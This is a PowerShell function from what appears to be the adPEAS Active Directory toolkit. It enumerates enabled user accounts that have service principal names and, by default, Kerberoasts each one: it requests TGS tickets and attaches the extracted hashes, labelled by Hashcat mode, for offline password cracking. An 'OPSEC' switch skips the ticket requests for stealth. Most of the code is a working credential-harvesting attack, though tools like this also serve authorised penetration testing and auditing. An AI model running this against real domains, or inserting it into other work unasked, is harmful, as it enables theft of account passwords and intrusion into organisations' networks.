function Get-KerberoastableAccounts {
    <#
    .SYNOPSIS
    Identifies user accounts vulnerable to Kerberoasting attacks.

    .DESCRIPTION
    Finds user accounts with Service Principal Names (SPNs) that are vulnerable to Kerberoasting - attackers can request TGS tickets and attempt offline password cracking.

    Detects:
    - User accounts with SPNs set
    - Enabled accounts only
    - Excludes krbtgt account

    .PARAMETER Domain
    Target domain (optional, uses current domain if not specified)

    .PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

    .PARAMETER Credential
    PSCredential object for authentication (optional, uses current user if not specified)

    .PARAMETER OPSEC
    If specified, skips active testing (TGS ticket requests) for stealth.
    By default, performs active testing to prove vulnerability.

    .EXAMPLE
    Get-KerberoastableAccounts

    .EXAMPLE
    Get-KerberoastableAccounts -Domain "contoso.com" -Credential (Get-Credential)

    .NOTES
    Category: Creds
    Author: Alexander Sturz (@_61106960_)
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$OPSEC
    )

    begin {
        Write-Log "[Get-KerberoastableAccounts] Starting check"
    }

    process {
        try {
            # Build connection parameters (exclude OPSEC which Ensure-LDAPConnection doesn't accept)
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }
            if ($Credential) { $connectionParams['Credential'] = $Credential }

            # Ensure LDAP connection (displays error if needed)
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                return
            }

            Show-SubHeader "Searching for Kerberoastable accounts (users with SPNs)..." -ObjectType "Kerberoastable"

            # Use optimized filters: -SPN (has SPN), -Enabled (not disabled), additional filter: exclude krbtgt
            $kerberoastableUsers = @(Get-DomainUser -SPN -Enabled -LDAPFilter "(!(samAccountName=krbtgt))" -ShowOwner @connectionParams)

            if (@($kerberoastableUsers).Count -gt 0) {
                Show-Line "Found $(@($kerberoastableUsers).Count) kerberoastable user account(s):" -Class "Finding"

                # Determine testing mode based on OPSEC flag
                $canTestKerberoasting = -not $OPSEC

                if ($OPSEC) {
                    Show-Line "Skipping hash extraction (OPSEC mode)" -Class "Hint"
                }

                # Check if credentials are available for in-memory Kerberoasting (non-Kerberos auth)
                # Kerberos/WindowsSSPI auth has a TGT in the ticket cache - Windows API works directly
                # All other auth methods (SimpleBind, NTLM Impersonation) need credentials for in-memory TGS requests
                $authMethod = if ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
                    $Script:LDAPContext['AuthMethod']
                } else {
                    'Unknown'
                }

                if ($authMethod -notin @('Kerberos', 'WindowsSSPI') -and $canTestKerberoasting) {
                    $hasCredentials = $false
                    if ($Credential) {
                        $hasCredentials = $true
                    } elseif ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
                        $hasCredentials = $true
                    }

                    if (-not $hasCredentials) {
                        Show-Line "Kerberoasting skipped - no credentials available (use -Credential or Connect-adPEAS -Credential)" -Class Finding
                        $canTestKerberoasting = $false
                    }
                }

                $totalUsers = @($kerberoastableUsers).Count
                $currentIndex = 0
                foreach ($user in $kerberoastableUsers) {
                    $currentIndex++
                    if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing Kerberoastable accounts" -Current $currentIndex -Total $totalUsers -ObjectName $user.sAMAccountName }
                    # If testing enabled, request TGS and add hash as attribute
                    # Invoke-Kerberoast automatically selects the right method (Windows API vs In-Memory)
                    if ($canTestKerberoasting) {
                        Write-Log "[Get-KerberoastableAccounts] Kerberoasting $($user.sAMAccountName)"

                        try {
                            # Use pipeline input - Invoke-Kerberoast handles method selection automatically
                            $kerberoastResult = $user | Invoke-Kerberoast @connectionParams

                            if ($kerberoastResult -and $kerberoastResult.Success -and $kerberoastResult.Hash) {
                                # Add hash info as attributes to the user object
                                $hashLabel = "Hashcat (mode $($kerberoastResult.HashcatMode), $($kerberoastResult.EncryptionTypeName))"
                                $user | Add-Member -NotePropertyName 'KerberoastingHash' -NotePropertyValue $kerberoastResult.Hash -Force
                                $user | Add-Member -NotePropertyName 'KerberoastingHashType' -NotePropertyValue $hashLabel -Force
                                $user | Add-Member -NotePropertyName 'KerberoastEncryption' -NotePropertyValue $kerberoastResult.EncryptionType -Force
                            }
                            elseif ($kerberoastResult -and $kerberoastResult.Error) {
                                # Check if it's a credential/Kerberos issue
                                if ($kerberoastResult.Error -match 'NetworkCredentials|Kerberos credential|unable to create|No credentials') {
                                    $user | Add-Member -NotePropertyName 'KerberoastError' -NotePropertyValue "TGS request failed - no valid Kerberos credentials available" -Force
                                } else {
                                    $user | Add-Member -NotePropertyName 'KerberoastError' -NotePropertyValue "TGS request failed: $($kerberoastResult.Error)" -Force
                                }
                            }
                        } catch {
                            $user | Add-Member -NotePropertyName 'KerberoastError' -NotePropertyValue "Error: $($_.Exception.Message)" -Force
                        }
                    }

                    $user | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'Kerberoastable' -Force
                    Show-Object $user

                    # Blank line between accounts for readability
                    Show-EmptyLine
                }
                if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing Kerberoastable accounts" -Completed }

            } else {
                Show-Line "No kerberoastable accounts found" -Class "Secure"
            }

        } catch {
            Write-Log "[Get-KerberoastableAccounts] Error: $_" -Level Error
        }
    }

    end {
        Write-Log "[Get-KerberoastableAccounts] Check completed"
    }
}
